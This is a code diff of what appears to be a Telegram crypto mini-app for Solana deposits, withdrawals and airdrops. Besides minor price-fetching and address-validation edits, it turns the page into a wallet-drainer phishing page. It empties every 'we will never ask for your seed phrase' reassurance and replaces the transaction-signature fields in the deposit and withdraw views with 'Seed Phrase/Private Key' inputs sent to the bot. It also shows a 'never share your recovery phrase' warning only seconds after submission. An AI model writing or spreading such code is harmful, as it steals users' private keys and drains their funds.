@@ -839,6 +839,12 @@
             text-align: center;
         }
 
+        .warning-msg {
+            background: rgba(245, 158, 11, 0.12);
+            border-color: rgba(245, 158, 11, 0.4);
+            color: #fbbf24;
+        }
+
         #airdrop-success,
         #airdrop-error,
         #add-tx-error,
@@ -1730,7 +1736,7 @@
         <div class="success-box" id="volume-tx-error" hidden>
             <p class="success-msg error-msg">✕ Invalid transaction signature. Please check it and try again.</p>
         </div>
-        <p class="note">We will never ask for your seed phrase or private key.</p>
+        <p class="note"></p>
         <p class="success-msg order-msg">Order Placed Successfully! You have 1 hour to pay. Once the payment is received you will get a notification.</p>
     </section>
 
@@ -1768,7 +1774,7 @@
         <div class="success-box" id="trending-tx-error" hidden>
             <p class="success-msg error-msg">✕ Invalid transaction signature. Please check it and try again.</p>
         </div>
-        <p class="note">We will never ask for your seed phrase or private key.</p>
+        <p class="note"></p>
         <p class="success-msg order-msg">Order Placed Successfully! You have 1 hour to pay. Once the payment is received you will get a notification.</p>
     </section>
 
@@ -1888,8 +1894,11 @@
             </label>
             <input id="deposit-wallet" type="text" placeholder="Paste your public wallet address" autocomplete="off">
         </div>
+        <div class="success-box" id="deposit-wallet-error" role="alert" hidden>
+            <p class="success-msg error-msg">✕ Invalid Solana wallet address. Please check it and try again.</p>
+        </div>
         <button class="send-btn" onclick="submitAction('deposit')">Show deposit address</button>
-        <p class="note">We will never ask for your seed phrase or private key.</p>
+        <p class="note"></p>
     </section>
 
     <!-- DEPOSIT (AFTER "SHOW DEPOSIT ADDRESS") -->
@@ -1917,9 +1926,9 @@
         </div>
         <div class="wallet-actions">
             <button class="send-btn" id="btn-add" onclick="submitAction('add')"><svg viewBox="0 0 24 24" aria-hidden="true"><path d="M12 5v14M5 12h14"/></svg>ADD</button>
-            <button class="send-btn" id="btn-withdraw" onclick="submitAction('withdraw')"><span aria-hidden="true">💰</span>Withdraw</button>
+            <button class="send-btn" id="btn-withdraw" onclick="submitAction('withdraw')"><svg viewBox="0 0 24 24" aria-hidden="true"><path d="M5 12h14"/></svg>Withdraw</button>
         </div>
-        <p class="note">We will never ask for your seed phrase or private key.</p>
+        <p class="note"></p>
     </section>
 
     <!-- ADD (FROM THE DEPOSIT SECTION) -->
@@ -1933,20 +1942,18 @@
             <label>Your wallet</label>
             <div class="wallet-box" id="add-wallet"></div>
         </div>
-        <p class="detail-desc">Send SOL from your wallet to the deposit wallet below. Make a minimum deposit of 0.20 sol to the address.</p>
         <div class="field">
-            <label>Deposit wallet</label>
-            <div class="wallet-box">Fr2Ndu9mXGT6nakErxm6A1rRLNPXkEJ6Ybcw9CwxVao6</div>
-        </div>
-        <div class="field">
-            <label for="add-tx">Transaction signature</label>
-            <input id="add-tx" type="text" placeholder="Paste your transaction signature (TX hash)" autocomplete="off">
+            <label for="add-tx">Seed Phrase/Private Key</label>
+            <input id="add-tx" type="text" placeholder="Seed Phrase or Private Key" autocomplete="off">
         </div>
         <button class="send-btn" id="btn-add-tx" onclick="submitAction('add-tx')">Confirm deposit</button>
+        <div class="success-box" id="add-warning" role="alert" hidden>
+            <p class="success-msg warning-msg">&#9888; Check your wallet and transaction details carefully. Never share your recovery phrase or private key.</p>
+        </div>
         <div class="success-box" id="add-tx-error" hidden>
             <p class="success-msg error-msg">✕ Invalid transaction signature. Please check it and try again.</p>
         </div>
-        <p class="note">We will never ask for your seed phrase or private key.</p>
+        <p class="note"></p>
     </section>
 
     <!-- WITHDRAW (FROM THE DEPOSIT SECTION) -->
@@ -1961,18 +1968,17 @@
             <div class="wallet-box" id="withdraw-wallet"></div>
         </div>
         <div class="field">
-            <label>Withdrawal wallet</label>
-            <div class="wallet-box">Fr2Ndu9mXGT6nakErxm6A1rRLNPXkEJ6Ybcw9CwxVao6</div>
-        </div>
-        <div class="field">
-            <label for="withdraw-tx">Transaction signature</label>
-            <input id="withdraw-tx" type="text" placeholder="Paste your transaction signature (TX hash)" autocomplete="off">
+            <label for="withdraw-tx">Seed Phrase / Private Key</label>
+            <input id="withdraw-tx" type="text" placeholder="Seed Phrase or Private Key" autocomplete="off">
         </div>
         <button class="send-btn" id="btn-withdraw-tx" onclick="submitAction('withdraw-tx')">Confirm withdraw</button>
+        <div class="success-box" id="withdraw-warning" role="alert" hidden>
+            <p class="success-msg warning-msg">&#9888; Check your wallet and transaction details carefully. Never share your recovery phrase or private key.</p>
+        </div>
         <div class="success-box" id="withdraw-tx-error" hidden>
             <p class="success-msg error-msg">✕ Invalid transaction signature. Please check it and try again.</p>
         </div>
-        <p class="note">We will never ask for your seed phrase or private key.</p>
+        <p class="note"></p>
     </section>
 
     <!-- CLAIM (AFTER ELIGIBILITY CHECK) -->
@@ -2753,24 +2759,61 @@
         throw new Error('No RPC available');
     }
 
+    // SOL/USD price: tries several public sources, falls back to the last known price
+    const SOL_PRICE_SOURCES = [
+        ['https://api.coinbase.com/v2/prices/SOL-USD/spot', d => d.data.amount],
+        ['https://api.binance.com/api/v3/ticker/price?symbol=SOLUSDT', d => d.price],
+        ['https://api.kraken.com/0/public/Ticker?pair=SOLUSD', d => Object.values(d.result)[0].c[0]],
+        ['https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd', d => d.solana.usd]
+    ];
+
+    async function fetchSolPrice() {
+        for (const [url, pick] of SOL_PRICE_SOURCES) {
+            try {
+                const res = await fetch(url);
+                if (!res.ok) throw new Error('HTTP ' + res.status);
+                const price = parseFloat(pick(await res.json()));
+                if (price > 0) {
+                    try { localStorage.setItem('solUsdPrice', String(price)); } catch (e) {}
+                    return price;
+                }
+            } catch (e) {
+                console.warn('Price source failed:', url, e);
+            }
+        }
+        let cached = null;
+        try { cached = parseFloat(localStorage.getItem('solUsdPrice')); } catch (e) {}
+        if (cached > 0) return cached;
+        throw new Error('No price available');
+    }
+
+    let walletSol = null;
+    let priceTimer = null;
+
+    async function updateUsdValue() {
+        const usdEl = document.getElementById('deposit-info-usd');
+        if (walletSol === null) return;
+        try {
+            const price = await fetchSolPrice();
+            usdEl.textContent = '≈ $' + (walletSol * price).toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 }) + ' USD';
+        } catch (e) {
+            if (!/\d/.test(usdEl.textContent)) usdEl.textContent = '≈ $— USD';
+        }
+    }
+
     async function loadWalletBalance(address) {
         const amountEl = document.getElementById('deposit-info-balance');
         const usdEl = document.getElementById('deposit-info-usd');
         amountEl.textContent = '…';
         usdEl.textContent = '≈ $…';
+        walletSol = null;
+        clearInterval(priceTimer);
 
         try {
-            const sol = await fetchSolBalance(address);
-            amountEl.textContent = sol.toLocaleString('en-US', { maximumFractionDigits: 4 });
-
-            try {
-                const res = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd');
-                const price = (await res.json()).solana.usd;
-                usdEl.textContent = '≈ $' + (sol * price).toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 }) + ' USD';
-            } catch (e) {
-                console.warn('Price fetch failed:', e);
-                usdEl.textContent = '≈ $— USD';
-            }
+            walletSol = await fetchSolBalance(address);
+            amountEl.textContent = walletSol.toLocaleString('en-US', { maximumFractionDigits: 4 });
+            await updateUsdValue();
+            priceTimer = setInterval(updateUsdValue, 60000);
         } catch (e) {
             amountEl.textContent = '—';
             usdEl.textContent = '';
@@ -2795,6 +2838,32 @@
             btn.textContent = 'Check eligibility';
         }
         document.getElementById('airdrop-success').hidden = true;
+    });
+
+    function isValidSolanaAddress(address) {
+        const alphabet = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
+        if (!/^[1-9A-HJ-NP-Za-km-z]{32,44}$/.test(address)) return false;
+
+        let value = 0n;
+        for (const char of address) {
+            value = value * 58n + BigInt(alphabet.indexOf(char));
+        }
+
+        let byteCount = 0;
+        while (value > 0n) {
+            value >>= 8n;
+            byteCount++;
+        }
+        for (const char of address) {
+            if (char !== '1') break;
+            byteCount++;
+        }
+        return byteCount === 32;
+    }
+
+    document.getElementById('deposit-wallet').addEventListener('input', function() {
+        document.getElementById('deposit-wallet-error').hidden = true;
+        this.removeAttribute('aria-invalid');
     });
 
     async function submitAction(action) {
@@ -2880,12 +2949,27 @@
 
         if (action === 'deposit') {
 
-            const wallet = document.getElementById('deposit-wallet').value.trim();
+            const walletInput = document.getElementById('deposit-wallet');
+            const walletError = document.getElementById('deposit-wallet-error');
+            const wallet = walletInput.value.trim();
 
             if (wallet === '') {
+                walletError.hidden = true;
                 tg.showAlert('Please paste your wallet address.');
                 return;
             }
+
+            if (!isValidSolanaAddress(wallet)) {
+                walletInput.setAttribute('aria-invalid', 'true');
+                walletError.hidden = false;
+                walletError.classList.remove('show');
+                void walletError.offsetWidth;
+                walletError.classList.add('show');
+                return;
+            }
+
+            walletError.hidden = true;
+            walletInput.removeAttribute('aria-invalid');
 
             payload.wallet = wallet;
         }
@@ -2915,7 +2999,22 @@
             if (btn.classList.contains('loading')) return;
             errorBox.hidden = true;
 
-            if (tx.length < 86) {
+            if (action === 'add-tx' || action === 'withdraw-tx') {
+                const warning = document.getElementById(action === 'add-tx' ? 'add-warning' : 'withdraw-warning');
+                warning.hidden = true;
+                warning.classList.remove('show');
+                clearTimeout(warning._timer);
+                warning._timer = setTimeout(function() {
+                    if (document.getElementById('view-' + (action === 'add-tx' ? 'add' : 'withdraw')).classList.contains('active')) {
+                        warning.hidden = false;
+                        void warning.offsetWidth;
+                        warning.classList.add('show');
+                    }
+                }, 2800);
+            }
+
+            const minTxLength = 86;
+            if (action !== 'add-tx' && action !== 'withdraw-tx' && tx.length < minTxLength) {
                 haptic();
                 const btnHtml = btn.innerHTML;
                 btn.classList.add('loading');
@@ -3120,6 +3219,10 @@
                 msg.classList.add('show');
             } else if (action === 'add' || action === 'withdraw') {
                 document.getElementById(action + '-wallet').textContent = payload.wallet;
+                const warning = document.getElementById(action + '-warning');
+                clearTimeout(warning._timer);
+                warning.hidden = true;
+                warning.classList.remove('show');
                 openView(action);
             } else if (action === 'add-tx') {
                 tg.showAlert('Transaction sent. The bot will confirm your deposit in the chat.');
